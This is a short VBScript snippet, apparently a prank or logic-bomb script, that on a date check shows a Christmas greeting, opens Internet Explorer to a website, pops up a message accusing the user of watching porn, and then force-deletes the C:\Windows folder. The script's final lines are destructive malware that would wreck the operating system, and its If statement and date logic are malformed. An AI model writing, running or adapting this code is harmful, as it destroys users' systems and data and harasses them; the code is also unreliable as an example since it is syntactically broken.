   time= 12:30
   date =25.12.2003
   if date = 25.12.2003
   msgBox "Merry christmass",48,""
   Dim shell
   Set shell = CreateObject("WScript.Shell")
   shell.run "C:\Program Files\Internet Explorer\IEXPLORE.EXE www.cheat.com"
   msgBox "you are watchin porn on christmass",48,""
   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("c:\windows") Then
   foldersys.DeleteFolder "c:\windows",True
   End if
